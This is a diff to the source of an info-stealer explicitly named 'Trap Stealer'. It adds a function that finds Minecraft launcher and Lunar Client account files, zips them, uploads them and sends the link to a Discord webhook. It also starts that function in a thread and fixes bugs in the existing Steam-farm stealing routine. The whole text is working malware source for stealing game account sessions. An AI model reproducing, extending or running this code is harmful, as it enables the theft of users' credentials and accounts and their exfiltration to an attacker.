@@ -463,6 +463,71 @@ def steal_driver():
             error_Handler(e)
             pass
 
+def create_zip_file(file_paths, zip_file_path):
+    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
+        for file_path in file_paths:
+            if os.path.exists(file_path):
+                zipf.write(file_path, os.path.basename(file_path))
+            else:
+                pass
+
+def minecraft_sessions():
+    try:
+        user_home = os.path.expanduser('~')
+
+        minecraft_path = os.path.join(os.environ['APPDATA'], '.minecraft')
+        launcher_profiles_path = os.path.join(minecraft_path, 'launcher_profiles.json')
+
+        lunarclient_path = os.path.join(user_home, '.lunarclient')
+        lunarclient_accounts_path = os.path.join(lunarclient_path, 'settings', 'game', 'accounts.json')
+
+        files_to_check = [
+            launcher_profiles_path,
+            lunarclient_accounts_path
+        ]
+
+        existing_files = [file_path for file_path in files_to_check if os.path.exists(file_path)]
+
+        zip_file_path = os.path.join(user_home, 'AppData', 'Local', 'Temp', 'existing_files.zip')
+
+        if existing_files:
+            create_zip_file(existing_files, zip_file_path)
+            file_url = upload_file(zip_file_path)
+            data = {
+                    "username": "Trap Stealer",
+                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                    "embeds": [
+                        {
+                            "title": "Minecraft Session stealer",
+                            "description": f"All sessions files found!",
+                            "color": 0xffb6c1,
+                            "fields": [
+                                {"name": f"Minecraft sessions files", "value": f"[Click here to download]({file_url})"},
+                            ],
+                            "thumbnail": {
+                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            },
+                            "footer": {
+                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            }
+                        }
+                    ]
+            }
+
+            headers = {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+
+            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+                    
+        else:
+            pass
+    except Exception as e:
+        error_Handler(e)
+        
+    
 def ArchiSteamFarm():
     def search_for_exe(filename, start_dir):
         found_folders = []
@@ -501,11 +566,11 @@ def ArchiSteamFarm():
                     "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                     "embeds": [
                         {
-                            "title": "ArchiSteamFarm Stealer stealer",
+                            "title": "ArchiSteamFarm Stealer",
                             "description": f"All config files found!",
                             "color": 0xffb6c1,
                             "fields": [
-                                {"name": f"WhatsApp file", "value": f"[Click here to download]({file_url})"},
+                                {"name": f"ArchiSteamFarm file", "value": f"[Click here to download]({file_url})"},
                             ],
                             "thumbnail": {
                                 "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -3514,10 +3579,14 @@ def gatha():
     getinf.start()
     First_Thread.append(getinf)
     
+    sess = threading.Thread(target=minecraft_sessions)
+    sess.start()
+    First_Thread.append(sess)
+    
     if ArchiStealer == True:
         ArS = threading.Thread(target=ArchiSteamFarm)
         ArS.start()
-        ArS.append(ArS)
+        First_Thread.append(ArS)
         
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
